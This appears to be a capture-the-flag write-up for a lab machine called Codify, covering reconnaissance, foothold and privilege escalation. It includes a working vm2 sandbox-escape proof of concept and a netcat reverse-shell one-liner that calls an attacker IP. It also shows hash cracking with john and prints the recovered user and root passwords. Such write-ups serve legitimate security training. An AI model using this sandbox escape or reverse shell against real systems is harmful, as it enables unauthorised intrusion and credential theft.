## Intro

Tags: #linux #OSCPpath #WebApp #unknown-binary #easy 

-------
# Reconnaissance

## Port scan

### TCP 
```shell
sudo nmap -sC -sV codify.htb
```

```shell
Nmap scan report for codify.htb (10.10.11.239)
Host is up (0.13s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 96:07:1c:c6:77:3e:07:a0:cc:6f:24:19:74:4d:57:0b (ECDSA)
|_  256 0b:a4:c0:cf:e2:3b:95:ae:f6:f5:df:7d:0c:88:d6:ce (ED25519)
80/tcp   open  http    Apache httpd 2.4.52
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.52 (Ubuntu)
3000/tcp open  http    Node.js Express framework
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /opt/homebrew/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Nov 13 15:29:58 2023 -- 1 IP address (1 host up) scanned in 109.65 seconds
```

## WebApp

Navigating to the webapp we come accross this page
![](MediaFiles/Pasted%20image%2020261003001142.png)
`About Us` : This page explained that Codify is a Node.js sandbox environment using the vm2 library to execute untrusted code safely.

### Node js execution

clicking try now:
![](MediaFiles/Pasted%20image%2020261003001158.png)
goes to a page where node js code execution is allowed

-----
# Foothold

## Node js reverse shell

Found a `node js rev shell` AND by running it i got rev shell 
```shell
rm /tmp/f; mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.247 9001 >/tmp/f
```
place this inside "command" below
```js
const {VM} = require("vm2");
const vm = new VM();

const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('command');
}
`

console.log(vm.run(code));
```
## Shell as svc

```shell
└─# nc -nvlp 9001
listening on [any] 9001 ...
connect to [10.10.14.147] from (UNKNOWN) [10.129.67.147] 52094
bash: cannot set terminal process group (1238): Inappropriate ioctl for device
bash: no job control in this shell
svc@codify:~$
```

### Users enumeration

```shell
svc@codify:~$ ls -alh ..
ls -alh ..
total 16K
drwxr-xr-x  4 joshua joshua 4.0K Sep 12 17:10 .
drwxr-xr-x 18 root   root   4.0K Oct 31 07:57 ..
drwxrwx---  3 joshua joshua 4.0K Nov  2 12:22 joshua
drwxr-x---  4 svc    svc    4.0K Sep 26 10:00 svc
```
okay there is one more user called `joshua`, lets keep that in mind

### Processes

```shell
ps aux

www-data    1167  0.0  0.1 1248900 5968 ?        Sl   19:57   0:00 /usr/sbin/apache2 -k start
www-data    1168  0.0  0.1 1249032 6632 ?        Sl   19:57   0:00 /usr/sbin/apache2 -k start
root        1233  0.0  2.0 1614296 79860 ?       Ssl  19:57   0:01 /usr/bin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock
svc         1238  0.4  1.4 643260 58900 ?        Ssl  19:57   0:06 PM2 v5.3.0: God Daemon (/home/svc/.pm2)
svc         1256  0.3  1.5 654004 62572 ?        Sl   19:57   0:04 node /var/www/editor/index.js
svc         1257  0.2  1.5 653800 62548 ?        Sl   19:57   0:04 node /var/www/editor/index.js
svc         1273  0.2  1.5 653800 62460 ?        Sl   19:57   0:04 node /var/www/editor/index.js
svc         1277  0.2  1.5 653864 62032 ?        Sl   19:57   0:04 node /var/www/editor/index.js
svc         1463  0.3  1.5 654212 62852 ?        Sl   19:57   0:05 node /var/www/editor/index.js
root        1564  0.0  0.0   2888   956 ?        Ss   19:57   0:00 /bin/sh /root/scripts/other/docker-startup.sh
root        1565  0.2  0.8 190444 33940 ?        Sl   19:57   0:03 /usr/bin/python3 /usr/bin/docker-compose -f /root/scripts/docker/docker-compose.yml up
root        1634  0.0  0.0 1082092 2892 ?        Sl   19:57   0:00 /usr/bin/docker-proxy -proto tcp -host-ip 127.0.0.1 -host-port 3306 -container-ip 172.19.0.2 -container-port 3306
root        1653  0.0  0.3 722280 12232 ?        Sl   19:57   0:00 /usr/bin/containerd-shim-runc-v2 -namespace moby -id f88b314ed6a4f84693267bda194d6266bdde5798ef5ccd082109b2566fda07f8 -address /run/containerd/containerd.sock
lxd         1673  0.0  2.5 1209952 101224 ?      Ssl  19:57   0:00 mariadbd
svc         1885  0.2  1.4 644132 59364 ?        Sl   20:11   0:01 node /var/www/editor/index.js
```
it seems that a node js app is running , and its default port is usually 3000 (we see `node` in some processes followed by js file) 

We also have a docker running that has a container for the database on port 3306, which is a MariaDB. Which is an open source MySQL.

### Filesystem enumeration

```shell
svc@codify:/var/www/contact$ ls -lah
ls -lah
total 120K
drwxr-xr-x 3 svc  svc  4.0K Sep 12 17:45 .
drwxr-xr-x 5 root root 4.0K Sep 12 17:40 ..
-rw-rw-r-- 1 svc  svc  4.3K Apr 19  2023 index.js
-rw-rw-r-- 1 svc  svc   268 Apr 19  2023 package.json
-rw-rw-r-- 1 svc  svc   76K Apr 19  2023 package-lock.json
drwxrwxr-x 2 svc  svc  4.0K Apr 21  2023 templates
-rw-r--r-- 1 svc  svc   20K Sep 12 17:45 tickets.db
```
downloading the .`db` sqlite file or by viewing it
```shell
svc@codify:/var/www/contact$ strings tickets.db

SQLite format 3
tabletickets
...
CREATE TABLE users ( 
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE, 
        password TEXT
    )
...
joshua
$2a$12$SOn8Pf6z8fO/***********/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```

inside i found user and hash! 
#### hash obtained
```
joshua
$2a$12$SOn8Pf6z8fO/***********/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```

### Cracking hash

```shell
echo '$2a$12$SOn8Pf6z8fO/***********//P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2' > joshua.hash
```

```shell
└─# john -w=/usr/share/wordlists/rockyou.txt joshua.hash 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 4096 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
spongebob1       (?)     
1g 0:00:00:39 DONE (2023-11-06 15:27) 0.02550g/s 34.88p/s 34.88c/s 34.88C/s crazy1..angel123
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

#### creds obtained
```
joshua
spongebob1
```

## Shell as joshua

changed to user joshua and grabbed root flag
```shell
svc@codify:/var/www/contact$ su joshua
Password: 
joshua@codify:/var/www/contact$ id
uid=1000(joshua) gid=1000(joshua) groups=1000(joshua)
```

---
# Privesc

## sudo -l

![](MediaFiles/Pasted%20image%2020261003000838.png)

### Custom script

lets inspect the `mysql-backup.sh`
```bash
#!/bin/bash  
DB_USER="root"  
DB_PASS=$(/usr/bin/cat /root/.creds)  
BACKUP_DIR="/var/backups/mysql"  
  
read -s -p "Enter MySQL password for $DB_USER: " USER_PASS  
/usr/bin/echo  
  
if [[ $DB_PASS == $USER_PASS ]]; then  
/usr/bin/echo "Password confirmed!"  
else  
/usr/bin/echo "Password confirmation failed!"  
exit 1  
fi  
  
/usr/bin/mkdir -p "$BACKUP_DIR"  
  
databases=$(/usr/bin/mysql -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" -e "SHOW DATABASES;" | /usr/bin/grep -Ev "(Database|information_schema|performance_schema)")  
  
for db in $databases; do  
/usr/bin/echo "Backing up database: $db"  
/usr/bin/mysqldump --force -u "$DB_USER" -h 0.0.0.0 -P 3306 -p"$DB_PASS" "$db" | /usr/bin/gzip > "$BACKUP_DIR/$db.sql.gz"  
done  
  
/usr/bin/echo "All databases backed up successfully!"  
/usr/bin/echo "Changing the permissions"  
/usr/bin/chown root:sys-adm "$BACKUP_DIR"  
/usr/bin/chmod 774 -R "$BACKUP_DIR"  
/usr/bin/echo 'Done!'
```
lets run it
```shell
sudo /opt/scripts/mysql-backup.sh
```

### Processes via pspy64

now upload `pspy64` and by running it we can see
![](MediaFiles/Pasted%20image%2020261003000322.png)
#### creds obtained
```
root
kljh12k3jhaskjh12kjh3
```

## Shell as root

changed to user root with the password above and got root shell, grabbed root flag 
```shell
joshua@codify:/tmp$ su root
Password:
root@codify:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@codify:/tmp# ls -la ~
total 40
drwx------  5 root root 4096 Sep 26 09:35 .
drwxr-xr-x 18 root root 4096 Oct 31 07:57 ..
lrwxrwxrwx  1 root root    9 Sep 14 03:26 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Oct 15  2021 .bashrc
-rw-r--r--  1 root root   22 May  8  2023 .creds
drwxr-xr-x  3 root root 4096 Sep 26 09:35 .local
lrwxrwxrwx  1 root root    9 Sep 14 03:34 .mysql_history -> /dev/null
-rw-r--r--  1 root root  161 Jul  9  2019 .profile
-rw-r-----  1 root root   33 Nov 14 07:14 root.txt
drwxr-xr-x  4 root root 4096 Sep 12 16:56 scripts
drwx------  2 root root 4096 Sep 14 03:31 .ssh
-rw-r--r--  1 root root   39 Sep 14 03:26 .vimrc
root@codify:/tmp# cat ~/root.txt
```

-----
